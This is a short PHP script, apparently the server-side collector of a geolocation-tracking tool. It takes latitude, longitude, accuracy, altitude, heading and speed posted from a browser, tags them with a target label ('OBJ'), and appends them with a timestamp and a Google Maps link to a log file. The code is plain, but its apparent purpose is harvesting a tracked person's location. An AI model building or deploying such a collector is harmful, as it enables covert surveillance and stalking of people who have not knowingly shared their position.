<?php
date_default_timezone_set('America/Lima');
header('Content-Type: text/html');
{
    $lat = $_POST['Lat'];
    $lon = $_POST['Lon'];
    $acc = $_POST['Acc'];
    $alt = $_POST['Alt'];
    $dir = $_POST['Dir'];
    $spd = $_POST['Spd'];

    $obj = $_POST['Uis'];

    $f = fopen('result.txt', 'a+');
    fwrite($f, "#######FECHA Y HORA " . date("d-m-Y H:i:s") . "#######\n");
    fwrite($f, "------------INFORMACION GEO:-------------\n");
    fwrite($f, "--------------OBJ: " . $obj . "------------\n");
    fwrite($f, "Latitud ....:	" . $lat . "\n");
    fwrite($f, "Longitud ...:	" . $lon . "\n");
    fwrite($f, "Exactitud ..:	" . $acc . "\n");
    fwrite($f, "Altitud ....:	" . $alt . "\n");
    fwrite($f, "Direccion ..:	" . $dir . "\n");
    fwrite($f, "Velocidad ..:	" . $spd . "\n\n");
    fwrite($f, "Google Maps.:   https://www.google.com/maps/place/" . $lat . "+" . $lon . "\n\n\n");
    fclose($f);
}
?>
